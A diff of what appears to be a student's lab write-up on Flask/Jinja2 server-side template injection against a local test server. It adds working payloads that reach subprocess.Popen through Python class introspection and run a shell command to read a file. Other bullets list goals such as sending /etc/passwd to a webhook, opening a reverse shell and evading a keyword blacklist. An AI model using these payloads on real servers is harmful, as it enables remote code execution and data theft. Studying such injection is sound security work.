@@ -41,22 +41,30 @@ url encoding the block we get the payload as: ```%7B%25%20set%20subclasses%20%3D
 ![image](https://github.com/poorvi1910/Web/assets/146640913/433ab890-0a54-4476-a97c-725822933382)
 [SAME PAYLOAD WORKS AGAINST BLACKLIST TOO]
 
-- get name of current python flask script
+- Get name of current python flask script
 
 
-- get all the current envvars
+- Get all the current envvars
 
 
-- read a local file
+- Read a local file
+
+```http://127.0.0.1:5000/?c={{().__class__}}``` : ```<class 'tuple'>``` : class method returns the class of the object that is an empty tuple over here
+
+```http://127.0.0.1:5000/?c={{().__class__.__mro__[1].__subclasses__()[568]}}``` : ```<class 'subprocess.Popen'>``` : selecting the popen subprocess
+
+```http://127.0.0.1:5000/?c={{().__class__.__mro__[1].__subclasses__()[568](%27cat%20try.py%27,%20shell=True,%20stdout=-1).communicate()}}``` :  running cat command on a python file to read it
+
+![image](https://github.com/poorvi1910/Web/assets/146640913/a516db8b-213f-4e58-8650-585cac3a95de)
+[SAME PAYLOAD WORKS AGAINST BLACKLIST TOO]
+
+- Run a command
 
 
-- run a command
+- Send the contents of etc pass to  awebhook
 
 
-- send the contents of etc pass to  awebhook
+- Create a reverse shell, save your work and run the command yes on the rev shell
 
 
-- create a reverse shell, save your work and run the command yes on the rev shell
-
-
-- re-write everything above to work against this blacklist = [    "import",    "open",    "module",    "write",    "load",    "read",    "eval",    "exec",    "system",    "os",    "_",    #",    ',    "]
+- Re-write everything above to work against this blacklist = [    "import",    "open",    "module",    "write",    "load",    "read",    "eval",    "exec",    "system",    "os",    "_",    #",    ',    "]
